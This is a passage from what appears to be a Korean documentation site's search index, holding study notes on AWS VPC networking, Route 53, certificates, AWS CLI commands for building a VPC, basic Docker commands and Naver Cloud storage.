프라이빗과 퍼블릿의 기본 라우팅을 나타낸다.     NAT 게이트웨이    NAT 게이트웨이는 AWS에서 관리하는 NAT 디바이스이며, 인터넷 게이트웨이처럼 하나의 NAT 게이트웨이로 어떠한 용량의 요청도 수행할 수 있다.\n  한 종류의 NAT 게이트웨아만 제공되고, 자동 확장해서 모든 대역폭 요구에 대응하므로 용량 관리를 위한 디바이스에 엑세스할 필요가 없다.\n  NAT 게이트웨이를 생성할 때, EIP도 함께 할당해서 연결해야하고, 퍼블릭 서브넷 한 곳에 배포해서 인터넷에 엑세스할 수 있게 해야 한다.\n  NAT 게이트웨이는 포함되어 있는 서브넷에서 프라이빗 IP주소를 할당받는다.\n  NAT 게이트웨이를 생성 후에는 기본 라우팅을 만들어야 인스턴스의 인터넷 연결 트래픽이 NAT 게이트웨이로 전달된다.\n  NAT 게이트웨이의 명칭은 nat-xxxxxxxxx\u0026hellip; 이며 기본 라우팅을 여러 개 만들 수 있다.\n  NAT 게이트웨이는 ENI를 사용하지 않으므로 보안 그룹을 적용할 수는 없지만, 서브넷에 NACL을 적용해서 트래픽을 제어할 수 있다.\n     NAT 인스턴스    NAT 인스턴스는 사전 구성된 Linux 기반 AMI를 사용하는 일반적인 EC2 인스턴스로, 만들 때도 동일한 단게를 가진다.\n  NAT 게이트웨이와 다방면에서 동일하다 할 수 있지만, 몇 가지 다른 점이 존재한다.\n  NAT 인스턴스는 대역폭 요구가 증가하더라도 자동으로 확장되지 않는다. 즉, 적절한 성능을 갖춘 인스턴스를 초기에 맞게 생성해야한다.\n  NAT 인스턴스는 ENI가 있으므로 보안 그룹을 적용해야 하며, 퍼블릭 IP주소를 할당해야 한다.\n  NAT 인스턴스의 한 가지 이점은 배스천 호스트 ( Bastion Host : 점프 호스트 )로 사용해서 퍼블릭 IP가 없는 인스턴스에 연결할 수 있다는 것이며, NAT 게이트웨이로는 이 작업을 수행할 수 없다.\n  인스턴스나 가용 영역에 장애가 발생하면 다른 NAT 인스턴스로 확장하는 정도로는 간단한 대처가 불가능하며, 이는 기본 라우팅에 여러 NAT 인스턴스를 대상으로 경로를 지정할 수 없기 때문이다.\n  즉, 높은 탄력성이 요구되면 NAT 게이트웨이를 사용하는 것이 현명하다.\n     VPC 피어링    VPC 피어링을 구성하면 VPC의 인스턴스가 프라이빗 AWS 네트워크를 통해 다른 VPC와 통신하게 할 수 있다.\n  다른 리전에 있는 인스턴스와 통신이 필요할 때에도 이와 같은 작업을 수행할 수 있으며, 한 계정의 인스턴스를 다른 계정의 인스턴스와 연결할 수 있다.\n  VPC 피어링을 활성화하려면 두 VPC 사이에 VPC 피어링 연결을 설정해야 하며, VPC 피어링 연결은 아래와 같은 특징이 있다.\n 두 VPC 사이의 지점간의 연결이다. 두 VPC 간에는 단 하나의 피어링만 설정할 수 있다. 두 VPC 간에는 서로 다른 CIDR을 사용해야 한다.    VPC 피어링 연결은 인스턴스 간 통신만 허용된다. 즉, 한 VPC 인스턴스에서 피어링 된 다른 VPC사이의 지점간 연결이며, 두 VPC 간에는 단 하나의 피어링만 설정할 수 있고, 두 VPC의 CIDR 블록은 겹치지 않아야 한다.\n  인터넷 게이트웨이나 NAT 디바이스는 VPC 피어링으로 공유해서 사용할 수 없지만, Networkk Load Balancer만은 예외적으로 공유할 수 있다.\n  2개 이상의 VPC를 연결하려면 한 VPC와 다른 모든 VPC 각각 1:1 피어링 연결을 생성해야 하며, 데이지 체인 방식 ( 전이전 구성 )으로 라우팅은 불가능하다.\n  피어링 연결을 사용할면 트래픽이 양방향으로 오가도록 두 VPC에 새로운 라우팅을 만들어야 하고, 각 라우팅의 대상이 될 접두사는 대상 VPC 범위 내에 있어야 한다.\n  각 경로의 대상은 pcx-xxxxxxx로 시작되는 피어링 연결 식별자로 존재한다.\n     원본 VPC CIDR 대상 VPC CIDR 대상     10.0.0.0/16 172.31.0.0/16 pcx-xxxxxxxxxxx   172.31.0.0/16 10.0.0.0/16 pcx-xxxxxxxxxxx     위에 표는 라우팅이 서로 반대로 설정된 것은 양방향으로 트래픽을 허용한다는 의미이다. 대상 CIDR은 대상 VPC CIDR과 정확히 일치할 필요는 없으며, 특정 서브넷 사이에서 피어링을 사용하려면 서브넷 CIDR을 대신 지정할 수 있다.     요약    VPC 서비스는 EC2 및 다른 AWS 서비스의 네트워크 인프라를 제공하는 서비스이다.\n  AWS는 기존 네트워크보다 구성하기 쉽도록 일부 네트워크 구성 요소를 추상화했지만, 여전히 VPC를 설계하기 위해서는 네트워크 기초 지식이 필요하다.\n  AWS 각 리전의 기본 VPC에 자동으로 기본 서브넷, 기본 라우팅 테이블, 기본 보안 그룹, 기본 NACL을 제공한다. 많은 이들이 기반부터 VPC를 구성하지 않고 기본 VPC를 장기간으로 사용하고 있다.\n  AWS 아키텍트라면 가상 네트워크 인프라를 기반부터 구성하는 방법을 이해하는 것이 중요하다.\n  기본 VPC에서 구축한 인프라를 수정할 수 없을 때가 많지만, 대신 VPC를 기초부터 구성해서 인프라를 복제해야 하는 임무를 받을 수도 있다.\n  이 과정에서 여러 트러블을 해결하고 기초를 공부할 수 있고, 기능에 대한 이해의 학습을 도와준다.\n  기존의 네트워크에서는 서버 IP주소를 자유롭게 구성하고, 다른 서브넷으로 이동하며, 다른 물리적 위치로 이동시킬 수도 있다. 즉, 중간에 네트워크 계획을 변경할 수 있는 유연성이 존재하지만, VPC 생성 시에는 불가능하며, 이를 위해 사전에 인프라를 신중하게 계획해야 하므로, 전체 VPC와 EC2 구성 요소를 맞추는 방법을 이해하는 것이 중요하다.\n  CIDR로 표현되는 연속적 IP 주소 범위를 정하는 것으로 VPC를 생성하기 한다. 즉, CIDR의 범위를 사전에 모든 인스턴스들을 수용할 수 있을만큼 충분한 여유 주소를 넣어 두고 생성한다.\n  VPC CIDR을 서브넷으로 나눌 때는, 한 가용 영역에만 있는 컨테이너이기 때문에 인스턴스를 어디에 배치할지 사전에 결정해둬야 한다.\n  서브넷에 인스턴스를 만들고 난 인스턴스를 다른 서브넷으로 옮길 수 없다.\n  인스턴스를 시작하기 전에 보안 그룹을 구성할 필요가 있으며, 모든 인스턴스의 ENI에 보안 그룹을 하나 이상 연결해야 하며, 네트워크 엑세스 제어 목록은 상대적으로 변경이 가능해 유연성을 가지고 있으며, NACL은 언제든지 서브넷에 연결할 수 있고 제거가 가능하다.\n  인터넷에서 인스턴스에 엑세스할 수 있게 하려면 기본적으로 인터넷 게이트웨이를 프로비저닝하고 기본 라우팅과 퍼블릭 IP 주소를 할당시켜야 한다.\n  NAT 게이트웨이나 인스턴스 혹은 VPC 피어링 연결을 사용하기로 했다면 여러 라우팅 테이블을 수정해야 한다.\n     시험 핵심   VPC나 서브넷에 필요한 IP 주소의 수를 기반으로 올바른 CIDR 블록 접두사 길이를 결정할 수 있어야 한다.  접수다의 길이는 /16- /28까지 허용되며, 접두사의 길이가 길수록 사용할 수 있는 IP 주소 수는 줄어든다.      서브넷의 중요성을 이해한다.   서브넷은 EC2 인스턴스가 있는 논리적 컨테이너이다.\n  각 서브넷의 CIDR 블록은 그 서브넷에 속해 있는 VPC CIDR의 일부다.\n  한 서브넷에 속한 인스턴스는 그 서브넷의 CIDR 범위 내에서 프라이빗 IP주소를 가져온다.\n  모든 서브넷에 처음 4개의 IP 주소와 마지막 IP 주소는 AWS에서 예약하기 때문에 인스턴스에 할당이 불가능하다.\n      가용 영역 장애가 미치는 영향을 파악한다.   한 영역에 장애가 발생하면 해당 영역의 모든 서브넷과 해당 서브넷의 모든 인스턴스가 함께 중단된다.\n  한 영역에 장애가 일어나더라도 서비스의 중단을 피하려면 인스턴스를 여러 영역에 배포해 중복해서 구축한다.\n      탄력적 네트워크 인터페이스(ENI)를 생성하고 사용하기 위한 규칙을 이해한다.  모든 인스턴스에는 기본 프라이빗 IP 주소를 사용하는 기본 네트워크 인터페이스가 존재하야 하며, 인스턴스에 연결하는 추가 ENI는 기본 ENI와 같은 서브넷에 존재해야한다.      라우팅 테이블을 생성, 수정, 사용할 수 있어야 한다.  VPC의 기본 라우팅 테이블의 목적과 VPC의 서브넷의 관계를 알아야 한다. 인터넷 게이트웨이와 기본 라우팅 테이블을 사용해 퍼블릭 서브넷을 만드는 방법 또한 이해해야 한다.      보안 그룹과 네트워크 엑세스 제어 목록 간의 차이점을 파악한다.  상태 저장 보안 그룹과 상태비저장 NACL이 같은 결과를 얻기 위해서 각각 다르느 규칙을 사용해야 하는 이유를 이해한다.      네트워크 주소 변환이 어떻게 작동되는 지 이해한다.  인터넷 게이트웨이에서의 네트워크 주소 변환과 NAT 디바이스에서의 네트어크 주소 변환의 차이점을 이해한다. NAT 디바이스에서의 네트워크 주소 변환은 포트 주소변환(PAT)라 하며, 여러 인스턴스가 한 NAT 디바이스의 단일 퍼블릭 IP 주소를 공유할 수 있다.      여러 VPC 간에 VPC 피어링을 만들고 구성할 수 있어야 한다.  VPC 피어링 연결의 제한을 파악한다. VPC 피어링 연결은 전이 라우팅과 IPv6를 지원하지 않는다. 일부 리전에서는 리전 간에도 피어링할 수 있다.      "}),a.add({id:85,href:'/docs/aws/amazonwebservice/aws_network/',title:"AWS Network",content:"AWS Network   Amazon VPC ( Virtual Private Cloud )   AWS 상에 프라이빗 네트워크 공간을 구축할 수 있는 서비스 VPC를 이용하면 논리적인 네트워크 분리가 가능하고 라우팅 테이블과 각종 게이트웨이의 설정이 가능 AWS의 계정 전용 가상 네트워크 서비스 VPC 내에서 각종 리소스 ( EC2, RDS, ELB 등 )을 시작할 수 있으며 다른 가상 네트워크와 논리적으로 분리되어 있음 S3, Cloudfront 등은 다른 VPC 서비스로 VPC 내에서 생성되지 않음 각 Region 별로 VPC 가 다수 존재할 수 있음 VPC 하나의 사설 IP 대역을 보유하고, 서브넷을 생성하며 사설IP 대역 일부를 나누어 줄 수 있음 허용된 IP 블록 크기는 /16( IP 65536개 )- / 28 (IP 16개 ) 권고하는 VPC CIDR 블록 ( 사설 IP 대역과 동일 ) 10.0.0.0- 10.255.255.255( 10.0.0.0/8 ) 172.16.0.0- 172.31.255.255( 172.16.0.0/12 ) 192.168.0.0- 192.168.255.255( 192.168.0.0/16 )   Region  리전이란 AWS가 서비스를 제공하는 거점 ( 국가와 지역 )을 나타냅니다. 이는 모두 같은 방법 ( AWS 매니지먼트 콘솔, SDK, CLI )로 사용이 가능하며, 이를 통해 해외의 특정 서비스에 인프라 구축이 필요할 경우 큰 장점이 될 수 있음. AWS에서 사용하는 일종의 IDC의 집합으로 거의 모든 클라우드 서비스가 탑재되는 것으로 다수의 Availability Zone( 가용영역 )으로 구성됨 한 곳의 AZ의 기능이 마비되어도 다른 AZ가 기능을 수행 전 세계 주요 대도시에는 분포되어있음 AWS 사용자는 각 Region 마다 별도의 클라우드 망을 구축할 수 있음   Availability zone  가용 영역은 데이터 센터와 같은 의미라고 할 수 있습니다. 중국을 제외한 각각의 리전에는 2개 이상의 AZ가 존재하며, AWS 사용자가 원하는 AZ를 선택해서 시스템을 구축하는 것이 가능합니다. 즉, On Premise 구성으로 구현하기 힘든 여러 개의 데이터 센터를 사용한 시스템 구성 ( 한 국가 내부의 DR ) 구성 등을 쉽게 구현할 수 있습니다.   VPC Peering  VPC 간의 트래픽을 전송하기 위한 기능 Source VPC와 같은 / 다른 리전의 VPC를 Destination으로 선택하여 Peering 요청을 보낸 후, 수락시 Peering 가능 요청과 수락이 필요한 이유는 다른 계정의 VPC도 연결 가능하기 때문 Peering 생성 후 라우팅 테이블에 해당 peering을 집어넣으면 통신 시작 VPC peering은 Transit Routing 불가 ( 재가의 VPC가 하나의 VPC를 통해 통신하는 것 )   VPC Endpoint  VPC 내 요소들과 비 VPC 서비스( S3, CloudWatch, Athena 등 )을 외부인터넷을 거치지 않고 아마존 내부 백본 네트워크를 통해 연결하는 방법 그러므로 후술한 Direct Connect와 같은 전용선 서비스나 VPN, 인터넷 게이트웨이와 같은 외부 연결이 되어 있지 않는 서브넷에서 아마존의 여러 서비스를 연결가능 간단히 말하면 아마존 서비스 전용선 VPC 엔드포인트에는 Interface Endpoint, Gateway Endpoint 두 종류가 존재 Gateway Endpoint는 S3와 Dynamo DB만 가능   Subnet  VPC 내 생성된 분리된 네트워크로 하나의 서브넷은 하나의 AZ ( Avaiability Zone ) 에 연결 VPC가 가지고 있는 사설 IP 범위 내에서 ‘서브넷’을 쪼개어 사용가능 실직적으로 리소스들을 이 서브넷에서 생성이 되며 사설 IP를 기본적으로 할당받고 필요에 따라 공인 IP를 할당받음 하나의 서브넷은 하나의 라우팅 테이블과 하나의 NACL( Network ACL ) 을 가짐 서브넷에서 생성되는 리소스에 공인 IP 자동할당 여부를 설정할 수 있음 이 기능을 통해 Public Subnet과 Private Subnet을 만들어 커스터마이징 가능 서브넷 트래픽이 후술할 인터넷 게이트웨이로 라우팅이 되는 경우 해당 서브넷을 Public Subnet, 그렇지 않은 서브넷의 경우 Private Subnet이라 함 각 서브넷의 CIDR 블록에서 4개의 IP 주소와 마지막 IP 주소는 예약 주소로 사용자가 사용할 수 없음, 예를 들어 서브넷 주소가 172.16.1.0/24일 경우 172.16.1.0: 네트워크 주소 ( Network ID ) 172.16.1.1: VPC Router용 예약 주소 ( Gateway ) 172.16.1.2: DNS 서버의 IP주소 172.16.1.3: 향 후 사용할 예약 주소 172.16.1.255: 네트워크 브로드캐스트 주소   VPN ( Virtual Private Network )  AWS의 IPSEC VPN 서비스 이 VPN을 통해 AWS와 On-premise의 VPN을 연결하는 것이 가능 고객 측 공인 IP를 뜻하는 ‘Customer Gateway’와 AWS 측 게이트웨이인 ‘Virtual Private Gateway’ 생성 후 터널을 생성하면 사용 가능 반드시 VPC에서 VPN 터널 쪽으로 라우팅을 생성해야 함   Direct Connect  AWS의 데이터센터 및 오피스 네트워크와의 전용선 서비스 표준 이더네세 광섬유 케이블을 이용하여 케이블 한쪽을 사용자 내부 네트워크의 라우터에 연결하고 한 쪽을 Direct Connect 라우터에 연결하여 내부 네트워크 AWS VPC를 연결 보통 On-premise의 네트워크와 VPC를 연결할 때 사용 VPN보다 더 안전하고 빠른 속도를 보장 받고 싶을 때 사용 ( 백업 등 )   전용선 열결\n  VPC 사용한 Public Subnet\u0026amp; Private Subnet 생성 실습   Amazon CloudFront    .html, .css, .js 및 이미지 파일과 같은 정적 및 동적 웹 콘텐츠를 사용자에게 더 빨리 배포하도록 지원하는 웹 서비스 전 세계에 배치된 Edge location을 이용하여 효율적인 컨텐츠 배포 구조를 제공하는 것 Cloud Front는 HTTP/ HTTPS를 이용하여 S3 및 ELB, EC2, 외부 서버 등을 캐시하고 보다 빠른 속도로 콘텐츠를 전달하는 캐시 서버 Distribution은 Edge Location의 집합을 의미 Edge Location은 주변 Origin Server의 콘텐츠를 Edge Location에 캐싱하고 각 Edge Location 간 공유를 통해 콘텐츠를 전달 S3, ELB, EC2 등의 AWS 서비스뿐만 아니라 외부의 서버도 캐싱 가능 ( Custom Orgin ) TTL을 조절하여 캐시 주기를 통제할 수 있음    AWS Direct Connect   온 프레미스에서 AWS로 전용 네트워크 연결을 쉡게 설정할 수 있는 클라우드 서비스 솔루션 AWS와 사용자 데이터 센터, 사무실 등의 환경 사이에 프라이빗 연결이 가능   Direct Connect의 이점   대역폭 비용 감소\n 대역폭 사용량이 많은 워크로드를 AWS에서 실행하려는 경우, AWS에서는 데이터를 직접 송수신하므로, 인터넷 서비스의 대한 의존도를 줄일 수 있음 전용 연결을 통해 전송되는 데이터 요금은 인터넷 데이터 전송 요금이 ㅇ닌 보다 저렴한 AWS Direct Connect 데이터 전송 요금으로 부과되어짐    일관된 네트워크 성능\n 데이터와 데이터의 라우팅 방식이 선택되면 인터넷 기반 연결에서 효율적인 네트워크 환경의 제공이 가능    모든 AWS 서비스와 호환 가능\n AWS Direct Connect는 네트워크 서비스의 일종으로, 인터넷을 통해 액세스 할 수 있는 모든 AWS 서비스와 연동    AMAZON VPC로 프라이빗 연결\n AWS Direct Connect를 사용하여 온프레미스 네트워크에서 직접 Amazon VPC로 프라이빗 가상 인터페이스를 설정함으로써 네트워크와 VPC 간에 네트워크 연결을 제공할 수 있음 여러 가상 인터페이스를 사용하면 네트워크 격리를 유지하면서 여러 VPC 프라이빗 연결을 설정할 수 있음    탄력성\n AWS Direct Connect를 사용하면 요구 사항에 맞게 연결을 용량을 손쉽게 조정이 가능    간편성\n AWS Direct Connect는 직접 설치하는 것이 아닌, 설정하는 것으로 간편함      AWS Route 53    AWS의 DNS 서비스 ( 도메인 등록, DNS 라우팅, Health check ) 도메인 등록시 약 12.000원 정도 지불해야 하며, 최대 3일 정도 걸림 해당 도메인을 AWS 내 서비스 ( EC2, ELB, S3 등 ) 와 연결 할 수 있으며 AWS 외 요소들과도 연결 가능 도메인 생성 후 레코드 세트를 생성하여 하위 도메인을 등록할 수 있음 레코드 세트 등록시에는 IP 주소, 도메인, ‘Alias’ 등을 지정하여 쿼리를 라우팅할 수 있음 도메인 레지스트라 서비스를 통해 도메인 구매부터 정보 설정까지 Route 53으로 한번에 관리가 가능합니다. 장애 허용 아케텍처를 통해 시스템에 이상이 발생한 경우, 일시적으로 다른 서버로 전환하는 것이 가능합니다.   \rDNS\r↕\r\rDNS ( Domain Name System )   DNS란 도메인네임서버를 일컫으며, 인터넷은 서버들을 유일하게 구분할 수 있는 IP주소 체계를 보다 인간이 읽게 쉽게 하기 위해 계발되었다. 흔히 우리가 알고 있는 naver.com, google.com, daum.net 모두 DNS이다. AWS에서는 Route 53을 활용해 도메인 서비스를 지원한다.  \r\r\r  Route 53의 라우팅 정책  Simple : 동일 레코드 내에 다수의 IP를 지정하여 라우팅 가능, 값을 다수 지정한 경우 무작위로 반환함 Weighted : Region 별 부하 분산 가능, 각 가중치를 가진 동일한 이름의 A 레코드를 만들어 IP를 다르게 줌 Latency-based : 지연 시간이 가장 적은, 즉 응답시간이 가장 빠른 리전으로 쿼리를 요청 Failover : A/S 설정에서 사용됨, Main과 DR로 나누어 Main 장애시 DR로 쿼리 Geolocation : 각 지역을 기반으로 가장 가까운 리전으로 쿼리 수행, 레코드 생성시 지역을 지정할 수 있음 Geo-proximity : Traffic flow를 이용한 사용자 정의 DNS 쿼리 생성 가능 Multi-value answer : 다수의 IP를 지정한다는 것은 simpl와 비슷하지만 health check가 가능 ( 실패시 자동 Failover )     \rAWS Route 사용방법\r...\r\r AWS Route 사용방법  AWS 서비스에 route를 검색 후 Route 53을 선택한다.   Route 53의 원하는 서비스를 선택한다.    각 서비스의 간략한 설명   도메인 등록  단순 도메인을 구입하여 등록한다.    트래픽 흐름 처리  트래픽 처리 등의 룰을 추가한다.    DNS 관리  호스트 도메인을 등록한다    모니터링 서비스는 DNS 흐름 프로세스를 모니터링 하는 서비스 \r\r\r    \rAWS 콘솔 SSL/ TLS 설치\r...\r\r AWS 콘솔 SSL/ TLS 설치   AWS 서비스에서 certificate 검색   인증서를 만들 것인지 혹은 사설 인증기관을 사용할 것인지를 선택   프로비저닝이 선택할 경우  기존의 다른 업체에서 이미 발급받은 경우 Certificate Manager을 통해 등록이 가능하며, 무료로 발급도 가능    적용시킬 도메인 이름 선택    DNS 검증 : Certificate Manager에서 제시하는 특정 레코드를 추가해서 본임임을 인증 이메일 검증 : 해당 도메인의 관리자 계정으로 이메일을 보내서 본임임을 인증, 이 방법을 이용하기 위해서는 해당 도메인의 메일 서버에 연동되어 있어야 가능    검증방법 선택  요청이 완료되면 해당 도메인에 다음과 같은 이름과 값으로 CNAME 기록을 추가 해야 하며, AWS가 아닌 업체를 통해서 했다면 해당 업체의 사이트에서 레코드를 추가하면 되며, Route 53을 통해 자동으로 레코드 생성이 가능     발급한 인증서를 로드 밸런서의의 기존에 생성했던 리스너를 추가시킨 후, 인증서를 추가하면 추가가 완료된 것을 확인할 수 있으며, http://가 아닌 https:// 접속이 가능한 것을 확인할 수 있다.  \r\r\r  "}),a.add({id:86,href:'/docs/aws/awstraining/vpc/',title:"AWS 사용자 정의 VPC 생성",content:"AWS 사용자 정의 VPC 생성    AWS 사용자 정의 VPC 생성    이제 본격적으로 AWS 서비스들에 대해서 다루어 보겠습니다. 그 중, AWS 서비스의 근간이 VPC를 생성해 보도록 하겠습니다. VPC 중요한 개념이므로, VPC에 대한 개념이 부족한 분들은은 AWS VPC를 참고해주세요.     GUI 환경에서의 사용자 정의 VPC 생성   기본적인 VPC 생성의 순서\n1. VPC 네트워크 생성 2. Internet Gateway 설정\n2. Subnet 설정\n3. Route Table 설정\n5. Network ACL 설정\n6. Security Group 설정 여기에서는 ACL은 기본 값, Security Group에 대한 설정은 인스턴스를 생성할 때 설정하였습니다.\n   AWS 서비스에서 VPC를 검색합니다.      VPC 대시보드에서는 VPC서비스의 전체적인 서비스 상태를 확인할 수 있습니다. 좌측 메뉴에서 VPC 생성을 위해 VPC를 선택합니다.      AWS 가입시 기본적으로 기본 VPC가 생성되며, Custom VPC를 생성하기 위해 VPC 생성을 클릭합니다.      VPC 생성을 위해 VPC의 이름과 주소대역을 CIDR 형식으로 작성합니다.      생성이 완료되었습니다. 이제 인터넷에 연결하기 위해 인터넷 게이트웨이로 이동합니다.      인터넷 게이트 웨이를 생성합니다.      인터넷 게이트 웨이 생성 후, VPC를 연결합니다.      이제 서브넷 대역을 생성하기 위해 서브넷을 선택합니다.      현재 기본 VPC의 서브넷 대역이 3개가 존재합니다. 새로 생성한 Custom-VPC의 서브넷을 생성하기 위해 서브넷 생성을 클릭합니다.      저는 퍼블릭 대역 10.0.0.0/24와 프라이빗 10.0.10.0/24의 서브넷 대역을 생성해보겠습니다.      생성이 완료된 후, 라우팅 설정을 위해 라우팅 테이블을 클릭합니다.      퍼블릭, 프라이빗 라우팅 테이블을 생성합니다.      퍼블릭에서 하단에 서브넷 연결을 클릭 후, 서브넷 연결 편집에서 퍼블릭 서브넷을 등록시킵니다. 이와 동일하기 프라이빗 라우팅 테이블에 프라이빗 서브넷을 등록시킵니다.      서브넷 생성을 완료 후, 서브넷 연결의 좌측에 라우팅 편집을 클릭합니다.      퍼블릭과 프라이빗을 인터넷 게이트웨이에 연결시킵니다. 이것으로 GUI를 통한 VPC의 생성이 완료되었습니다. 다음 장에서 생성된 VPC대역에 인스턴스를 생성해보겠습니다.     AWS CLI로 VPC 생성   이번에는 VPC를 CLI 환경을 통해 생성해보도록 하겠습니다. CLI환경 또한 동일한 순서로 생성을 진행하겠습니다.   $ aws ec2 create-vpc --cidr-block 10.0.0.0/16 # 10.0.0.0/16의 CIDR을 가진 VPC를 생성합니다. $ aws ec2 modify-vpc-attribute --vpc-id [ VPC-ID ] --enable-dns-hostnames # [ VPC-ID ]를 가진 VPC에 DNS를 사용하도록 설정합니다. $ aws ec2 create-vpc --cidr-block 10.0.0.0/16 --instance-tenancy dedicated # 만약 vpc 네트워크의 Tenanacy를 Dedicated로 생성한다면 다음의 명령어를 통해 실행시킵니다.  VPC를 생성 및 설정합니다.     $ aws ec2 create-internet-gateway # 인터넷 게이트웨이를 생성합니다. $ aws ec2 attach-internet-gateway --internet-gateway-id [ igw ID ] --vpc-id [ VPC ID ] # VPC ID에 해당하는 VPC에 igw ID에 해당하는 인터넷 게이트웨이를 연결시킵니다.  인터넷 게이트웨이를 생성합니다.     $ aws ec2 create-subnet --vpc-id [ VPC-ID ] --availability-zone ap-northeast-2a --cidr-block 10.0.0.0/24 # VPC-ID에 해당하는 VPC에 ap-northeast-2a에 가용영역에서 10.0.0.0/24에 subnet을 생성합니다. $ aws ec2 create-subnet --vpc-id [ VPC-ID ] --availability-zone ap-northeast-2c --cidr-block 10.0.10.0/24 # VPC-ID에 해당하는 VPC에 ap-northeast-2c에 가용영역에서 10.0.10.0/24에 subnet을 생성합니다.  subnet을 생성 및 설정합니다.     $ aws ec2 create-route-table --vpc-id [ VPC-ID ] # VPC-ID에 해당하는 VPC에 route table을 생성합니다. $ aws ec2 associate-route-table --route-table-id [ rtb-id ] --subnet-id [ subnet-id ] # rtb-id에 해당하는 route table에 subnet-id에 해당하는 subnet을 등록시킵니다. $ aws ec2 create-route --route-table-id [ rtb-id ] --destination-cidr-block 0.0.0.0/0 --gateway-id [ igw-id ] # rtb-id에 해당하는 route table에 모든 게이트웨이를 [ igw-id ]에 연결합니다.  Route table을 생성 및 설정합니다.     $ aws ec2 describes-vpcs --vpc-id [ VPC-id ] $ aws ec2 describes-subnets --subnet-id [ subnet-id ] $ aws ec2 describes-internet-gateway --inernet-gateway-id [ igw-id ] $ aws ec2 describes-route-tables --route-table-id [ rtb-id ] # 생성 및 설정 확인  생성 및 설정을 확인합니다.    다음 장에서는 이번에 생성한 VPC를 사용하여, EC2를 생성해보도록 하겠습니다.  "}),a.add({id:87,href:'/docs/docker/docker/dockertraining/infradocker-04/',title:"Docker Basic",content:"Docker Basic          ****            "}),a.add({id:88,href:'/docs/docker/docker/docker/docker-4/',title:"Docker 기본 명령어",content:"Doker 기본 명령어   docker 명령어의 기본 형식 $ docker + \u0026lt; 명령어 \u0026gt; $ sudo usermod -aG docker ${USER} $ sudo service docker restart # user을 docker 그룹에 넣음  항상 root 권한으로 실행     Docker search 명령으로 이미지 검색 $ sudo docker search \u0026lt; 이미지 이름 \u0026gt;   보통 ubuntu, centos, redis 등 os나 프로그램 이름을 가진 이미지가 공식 이미지\n  나머지는 사용자들이 만들어서 공개한 이미지\n     Pull 명령으로 이미지 받기 $ sudo docker pull \u0026lt; 이미지:버전 \u0026gt; $ sudo docker pull ubuntu:latest   이미지 이름 뒤에 latest를 설정하면 최신 버전을 받음\n  이미지 이름에서 mung0001/ubuntu와 같이 /앞에 사용자명을 지정하면 해당 사용자가 올린 이미지를 받음\n  호스트에 설치된 리눅스 배포판과 도커 이미지의 배포판 종류는 달라도 상관은 없음\n     Images 명령으로 이미지 목록 출력하기 $ sudo docker images $ sudo docker images \u0026lt; image name \u0026gt;  docker iamges 뒤에 이미지 이름을 설정하면 특정 이미지를 검색할 수 있음     Run 명령으로 컨테이너 생성하기 $ sudo docker run \u0026lt; 옵션 \u0026gt; \u0026lt; 이미지 이름 \u0026gt; \u0026lt; 실행할 파일 \u0026gt; $ sudo docker run -i -t --name hello ubuntu /bin/bash   ubuntu 이미지를 컨테이너로 생성한 뒤 ubuntu 이미지 안의 /bin/bash를 실행\n  -i(interactive), -t(pseudo-tty) 옵션을 사용하면 실행된 Bash 셸에 입력 및 출력 가능\n  \u0026ndash;name 옵션으로 컨테이너에 이름을 지정할 수 있음. 이름을 지정하지 않으면 도커가 자동으로 이름을 생성하여 지정\n  cd, ls 명령으로 컨테이너 내부를 둘러본 뒤 exit 입력하여 Bash 셸에서 빠져 나오면 이미지에서 /bin/bash 실행 파일을 실행했기 때문에 컨테이너가 정지 (stop) 됨\n     Docker 컨테이너 목록 확인하기 $ sudo docker ps $ sudo docker ps -a   docker ps를 입력시 실행되고 있는 컨테이너만 실행 됨\n  -a를 입력시 정지된 상태의 모든 컨테이너를 출력\n     컨테이너 실행하기 $ sudo docker start \u0026lt; 컨테이너 이름 \u0026gt; $ sudo docker start HI   정지된 컨테이너를 시작하는 명령어\n  컨테이너 이름 대신 컨테이너 ID를 사용해도 됨\n     컨테이너 재시작하기 $ sudo docker restart \u0026lt; 컨테이너 이름 \u0026gt; $ sudo docker restart HI   OS를 재부팅하는 것처럼 컨테이너를 재시작\n  컨테이너 이름 대신 컨테이너 ID를 사용해도 됨\n     컨테이너에 접속하기 $ sudo docker attach \u0026lt; 컨테이너 이름 \u0026gt; $ sudo docker attach HI   명령을 실행하면 Bash 셸이 표시 됨\n  컨테이너 이름 대신 컨테이너 ID를 사용해도 됨\n  Bash 셸에서 exit 또는 ctrl + D를 입력하면 컨테이너가 정지됨\n  정지를 언하지 않을 시 ctrl + P or ctrl + Q를 차례대로 입력하여 컨테이너를 빠져나오면 됨\n     외부에서 컨터이너 안의 명령 실행시키기 $ sudo docker exec \u0026lt; 컨테이너 이름 \u0026gt; \u0026lt; 명령 \u0026gt; \u0026lt; 매개 변수 \u0026gt; $ sudo docker exec HI echo \u0026#34;HIYO\u0026#34;   컨테이너 이름 대신 컨테이너 ID를 사용해도 됨\n  컨테이너가 정지 된 상태에서는 사용할 수가 없음\n  docker exec 명령은 이미 실행된 컨테이너에서 apt-get, yum 명령으로 패키지를 설치하거나 각종 데몬을 실행할 때 활용\n     컨테이너 정지하기 $ sudo docker stop \u0026lt; 컨테이너 이름 \u0026gt; $ sudo docker stop HI  실행되고 있는 컨테이너를 정지     컨테이너 삭제하기 $ sudo docker rm \u0026lt; 컨테이너 이름 \u0026gt; $ sudo docker rm -f \u0026lt; 컨테이너 이름 \u0026gt; $ sudo docker rm HI   정지된 상태의 컨테이러 삭제\n  -f를 함께 사용시 실행되고 있는 컨테이너도 삭제\n     이미지 삭제하기 $ docker rmi \u0026lt; 이미지 이름 \u0026gt; : \u0026lt; 태그 \u0026gt; $ docker rmi ubuntu:16.04  이름만을 지정하고 태그를 지정하지 않으면 ubuntu의 이름을 가진 모든 ubuntu 삭제    "}),a.add({id:89,href:'/docs/gcp/',title:"Google Cloud Platform",content:""}),a.add({id:90,href:'/docs/ncp/ncptraining/nca04/',title:"Naver Cloud Storage",content:"Storage   클라우드 서비스 중 저장소에 관련된 서비스    Block Storage   일반적으로 서버에 추가하여 사용하는 스토리지     Object Storage    인터넷 상에 원하는 데이터를 저장하고 사용할 수 있또록 구축된 오브젝트 스토리지\n  객체 기반의 무제한 파일 저장 스토리지\n  콘솔, RESTful API, SDK 등의 다양한 방법으로 오브젝트들을 관리하고, 저장된 파일은 각 파일마다 고유한 접근 RUL을 사용\n  사용이 오래된 자료는 비교적 가격이 저렴한 Archive Storage로 이동\n  정적 웹 사이트 호스팅 가능\n    S3 Compatibility API 지원\n  Data Lifecycle 지원\n  Sub Account 와의 연동 접근 